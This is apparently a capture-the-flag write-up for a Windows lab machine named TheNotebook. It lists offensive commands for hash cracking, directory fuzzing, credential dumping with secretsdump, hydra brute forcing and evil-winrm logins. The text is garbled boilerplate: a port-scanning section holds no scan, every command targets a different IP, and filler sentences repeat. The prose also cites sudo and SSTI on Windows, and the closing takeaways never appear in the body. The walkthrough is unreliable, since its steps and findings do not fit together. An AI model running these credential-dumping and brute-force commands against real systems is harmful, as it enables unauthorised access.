---
TitleSEO: "VulnHub — TheNotebook (Medium Windows) | ZureFX"
TitlePost: "VulnHub — TheNotebook (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub TheNotebook. LAPS Abuse and ACL Abuse to achieve medium compromise on Windows."
Keywords: "forensics, ctf, insane, easy, medium"
URL: "https://zurefx.github.io/writeups/htb-thenotebook-732.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-thenotebook-732/"
Date: "2024-09-30"
Tags: "Forensics, CTF, Insane, Easy, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-thenotebook-732"
Permalink: "/writeups/htb-thenotebook-732.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **TheNotebook** is rated **Medium** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.41.34.192`.

### Objectives

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.82.172.245/FUZZ
gobuster dir -u http://10.117.233.42/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.91.108.119
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions.

### SMB Enumeration

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

```bash
gobuster dir -u http://10.83.42.252/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.15.73.183/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.13.241
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service.

## Exploitation

### Vulnerability Identification

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

Key finding: **SeImpersonatePrivilege**.

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

### Initial Access

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
crackmapexec smb 10.107.23.115 -u administrator -p 'P@ssw0rd!' --shares
```

Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

```powershell
feroxbuster -h
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.51.55.11/FUZZ
```

### Exploitation

Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.33.46.171 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.123.80.165 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.28.58.249 -u administrator -p 'P@ssw0rd!'
```

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

## Summary

### Tools Used

- `nmap`
- `psexec`
- `chisel`
- `feroxbuster`
- `netcat`

### Key Takeaways

- LAPS Abuse
- ACL Abuse
- SeImpersonatePrivilege
- Pass the Ticket
